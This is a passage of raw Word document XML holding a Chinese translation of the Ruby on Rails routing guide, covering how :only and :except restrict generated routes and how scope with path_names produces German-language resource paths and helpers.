        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对应到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:username]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 上。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D33DB4D"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4.6 对建立的路由进行限制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5970EE04"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默认地， Rails 会在应用中为每一个 RESTful 路由建立7个动作 （index, show, new, create, edit, update, and destroy）。不过你可以用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:only</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:except</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来针对你的路由进行调整：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5376"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="1A5C4930" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C67EF83" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1622414245"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resources :photos, :only</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; [:index, :show]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="61706CA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这样， 对于 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 请求将会成功，但是对 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 发起的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 请求（原本对应的是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 动作）将会失败。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310662E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:except</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项指定了你所_不_需要创建的动作。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4776"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4E03B4AC" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D0CC58E" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1191643366"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resources :photos, :except</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :destroy</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F370D6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在这里， Rails 会创建除了 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (针对 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/:id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 发起的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 请求) 之外的所有默认动作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E09862C"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如果你的应用程序有很多 RESTful 路由，使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:only</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:except</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可以只生成有用的路径，这能够减少匹配所需时间和内存。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6D45E3"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4.7 对路径进行翻译</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511EF1B3"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用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>scope</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 我们可以更改 resources 生成时的路径名</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8016"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="01B8FB31" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2B2B50D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scope(:path_names</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :new</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "neu", :edit</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "bearbeiten"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}) do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37CA439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:categories, :path</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "kategorien"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6590DE9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30892539"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Rails 将会建立一组匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CategoriesController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的路由规则。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1276"/>
        <w:gridCol w:w="3279"/>
        <w:gridCol w:w="1041"/>
        <w:gridCol w:w="2926"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="32B9CA47" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1865CBCF"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HTTP verb</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14489559"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Path </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3F96464F"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action </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0314096A" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">named helper </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="06F4A67E" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C91C41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1F1B621F"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/kategorien </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="788FFD9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index </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4700DB9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categories_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="07B50890" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72A3EE9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1603EC6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/kategorien/neu </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F90AFB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new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5CB0DA5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new_category_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5C8793A2" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47161E5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POST </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3696683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/kategorien </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4327D3F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create </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69FAFB4C"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categories_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4C747FB0" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5837A5D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69E0EEF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/kategorien/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="753D0BE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show </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="41FE1B9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category_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="1C1B4B08" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C536000"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GET </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1596AA68"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/kategorien/:id/bearbeiten </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5014196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edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E1FFC35"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edit_category_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="38A1224A" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5E1A3A3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PATCH/PUT </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F380E5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/kategorien/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="148A3E6D"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update </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="16899EE3"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category_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0E7AD1B2" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="18AD30B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DELETE </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4732F9C1"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/kategorien/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09A44512"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destroy </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7DFA82D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szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">category_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="18CB4DBE"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4.8 重定义单复数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A722EB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如果你想要为一个 resource 定义一个单数格式，你只要为 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Inflector</w:t>
      </w:r>
